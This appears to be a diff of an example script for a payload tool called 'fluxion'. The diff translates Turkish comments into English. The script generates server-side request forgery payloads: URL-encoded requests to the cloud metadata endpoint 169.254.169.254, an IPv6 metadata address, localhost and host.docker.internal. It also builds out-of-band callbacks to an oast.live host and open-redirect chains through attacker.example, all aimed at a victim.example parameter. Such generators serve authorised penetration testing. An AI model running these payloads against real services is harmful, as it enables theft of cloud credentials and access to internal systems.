@@ -1,40 +1,40 @@
 # examples/ssrf_payload_factory.flx
-# Kullanım:
-#   -D oast=YOUR.oast.live -D base="https://victim.example/view?url=" -D token=$(date +%s) -D redirect_base="https://attacker.example/r?u="
-#   python -m fluxion -s examples/ssrf_payload_factory.flx -D oast=... -D base=... -D token=...
+# Usage:
+#   python -m fluxion -s examples/ssrf_payload_factory.flx \
+#     -D oast=d41r8ucgtqkrv6t72u0gmht8euiepuo44.oast.live \
+#     -D base="https://victim.example/view?url=" \
+#     -D token=$(date +%s) \
+#     -D redirect_base="https://attacker.example/r?u="
 
 let oast = oast ?? "d41r8ucgtqkrv6t72u0gmht8euiepuo44.oast.live"
 let base = base ?? "https://victim.example/view?url="
 let redirect_base = redirect_base ?? "https://attacker.example/r?u="
 let t = token ?? "fluxion"
 
-# Aday hedefler
+# Internal targets commonly abused by SSRF probes
 let meta_http = "http://169.254.169.254/latest/meta-data/"
 let meta_ipv6 = "http://[fd00:ec2::254]/"
 let localhost = "http://127.0.0.1:80/"
 let docker    = "http://host.docker.internal/"
 
-# OAST url’leri
-let u1 = join("http://", t, ".", oast, "/")
-let u2 = join("http://", t, "-a.", oast, "/a")
-let u3 = join("http://", t, "-b.", oast, "/b?x=1")
+# Interactsh callback URLs
+let o1 = join("http://", t, ".", oast, "/")
+let o2 = join("http://", t, "-a.", oast, "/a")
+let o3 = join("http://", t, "-b.", oast, "/b?x=1")
 
-# Açık yönlendirme zinciri payloadları (redirector -> internal)
+# Redirectors that hop into internal targets
 let r_meta   = join(redirect_base, url_encode(meta_http))
 let r_local  = join(redirect_base, url_encode(localhost))
 let r_docker = join(redirect_base, url_encode(docker))
 
 let candidates = [
-  # Direkt OAST
-  join(base, url_encode(u1)),
-  join(base, url_encode(u2)),
-  join(base, url_encode(u3)),
-  # Direkt internal
+  join(base, url_encode(o1)),
+  join(base, url_encode(o2)),
+  join(base, url_encode(o3)),
   join(base, url_encode(meta_http)),
   join(base, url_encode(meta_ipv6)),
   join(base, url_encode(localhost)),
   join(base, url_encode(docker)),
-  # Redirect chain
   join(base, url_encode(r_meta)),
   join(base, url_encode(r_local)),
   join(base, url_encode(r_docker))
@@ -43,12 +43,8 @@ let candidates = [
 echo value=jsonify({
   "token": t,
   "base_param_prefix": base,
-  "payloads": candidates,
-  "notes": [
-    "OAST alt alanları DNS+HTTP hit üretir.",
-    "Redirect chain payloadlarını hedef paramına koy.",
-    "Bazı hedefler sadece ilk hop'u doğrular; allow_redirects zorunlu olabilir (app tarafı)."
-  ]
+  "payload_count": len(candidates),
+  "payloads": candidates
 })
 
 return len(candidates)
